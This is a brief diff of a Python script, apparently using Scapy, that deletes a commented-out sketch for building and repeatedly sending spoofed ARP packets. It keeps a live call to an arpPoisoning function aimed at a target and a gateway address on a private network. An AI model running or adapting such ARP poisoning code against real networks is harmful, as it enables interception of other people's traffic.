@@ -45,19 +45,4 @@ def arpPoisoning(target_ip, host_ip):
     except KeyboardInterrupt:
         sys.exit(0)
 
-# ip_src = "192.168.100.1"
-# ip_dst = "192.168.102.209"
-
-# ether = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff")
-# arp = ARP(psrc=ip_src, pdst=ip_dst, hwsrc=RandMAC())
-# ip = IP(src=ip_src, dst=ip_dst)
-# # pkt = ether / arp
-# pkt = arp / ip
-# print(pkt.show())
-
-# while True:
-#     send(pkt)
-#     time.sleep(0.2)
-
-
 arpPoisoning("192.168.102.209", "192.168.100.1")
